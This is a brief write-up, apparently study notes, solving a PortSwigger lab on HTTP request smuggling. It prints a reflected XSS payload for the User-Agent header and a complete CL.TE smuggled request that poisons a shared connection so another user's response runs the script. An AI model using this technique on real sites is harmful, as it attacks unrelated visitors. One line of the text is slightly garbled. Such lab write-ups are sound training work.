# Lab 12 — Exploiting HTTP request smuggling to deliver reflected XSS

> **Practitioner** · [Official lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)

**Entry point:** the comment form reflects the `User-Agent` header into a
hidden input — XSS everyone shares one poisoned connection.

## Solution

1. Confirm UA reflection in `POST /post/comment` → payload:

```
"/><script>alert(1)</script>
```

2. Smuggle the XSS request so the **next visitor** receives it:

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

3. Repeat a few times — the victim's request lands on the poisoned
   connection and executes — lab solved.
